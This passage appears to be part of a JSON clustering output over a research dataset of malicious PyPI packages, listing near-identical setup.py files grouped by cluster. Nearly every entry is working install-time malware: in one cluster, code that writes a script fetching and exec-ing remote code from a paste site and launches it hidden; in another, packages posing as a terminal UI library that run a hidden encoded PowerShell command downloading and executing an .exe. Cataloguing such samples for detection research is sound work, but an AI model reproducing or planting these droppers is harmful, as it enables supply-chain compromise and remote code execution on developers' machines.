required by your package here\n    ],\n)\n\n"
      }
    ]
  },
  {
    "cluster_id": 69,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-23-proxy-supporter-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n _ttmp = _ffile(delete=False)\n _ttmp.write(b\"\"\"from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://paste.bingner.com/paste/n7eue/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())\"\"\")\n _ttmp.close()\n try: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n except: pass\n\nsetup(\n    name='proxy-supporter',\n    packages=['proxy-supporter'],\n    version='1.0',\n    license='MIT',\n    description='idk',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-23-request-supporter-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n _ttmp = _ffile(delete=False)\n _ttmp.write(b\"\"\"from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://paste.bingner.com/paste/h82ox/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())\"\"\")\n _ttmp.close()\n try: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n except: pass\n\nsetup(\n    name='request-supporter',\n    packages=['request-supporter'],\n    version='1.0',\n    license='MIT',\n    description='idk',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-25-etherapi-v1.0",
        "code": "from setuptools import setup\n\n\n\n\nsetup(\n\n    name='etherapi',\n    packages=['etherapi'],\n    version='1.0',\n    license='MIT',\n    description='Ai Solver',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n _ttmp = _ffile(delete=False)\n _ttmp.write(b\"\"\"from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://paste.bingner.com/paste/qqrbb/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())\"\"\")\n _ttmp.close()\n try: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n except: pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-25-useragentclient-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n _ttmp = _ffile(delete=False)\n _ttmp.write(b\"\"\"from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://paste.bingner.com/paste/qqrbb/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())\"\"\")\n _ttmp.close()\n try: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n except: pass\n\n\nsetup(\n\n    name='useragentclient',\n    packages=['useragentclient'],\n    version='1.0',\n    license='MIT',\n    description='Ai Solver',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n"
      }
    ]
  },
  {
    "cluster_id": 70,
    "size": 26,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-esqgetlibpyw-v9.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgetlibpyw',\n    packages = ['modlib'],\n    version = '2.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-esqguiproofad-v6.36",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguiproofad',\n    packages = ['modlib'],\n    version = '4.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-esqproofpostvisa-v3.58",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofpostvisa',\n    packages = ['modlib'],\n    version = '1.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-esqtoolinfoultra-v7.18",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqtoolinfoultra',\n    packages = ['modlib'],\n    version = '7.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-libguigrandmc-v9.92",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libguigrandmc',\n    packages = ['modlib'],\n    version = '3.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-libguireplaceram-v9.30",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libguireplaceram',\n    packages = ['modlib'],\n    version = '2.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-libosintliblgtb-v5.94",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libosintlibLGTB',\n    packages = ['modlib'],\n    version = '6.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-libpingreintel-v5.74",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpingreintel',\n    packages = ['modlib'],\n    version = '9.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-libpywvisavirtual-v2.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpywvisavirtual',\n    packages = ['modlib'],\n    version = '6.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-py-controlpingcraft-v1.23",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlpingcraft',\n    packages = ['modlib'],\n    version = '8.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-py-mcultracraft-v10.87",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-mcultracraft',\n    packages = ['modlib'],\n    version = '8.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-py-toolvmintel-v9.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-toolvmintel',\n    packages = ['modlib'],\n    version = '2.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-rawrequest-v2.19",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'rawrequest',\n    packages = ['modlib'],\n    version = '9.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language 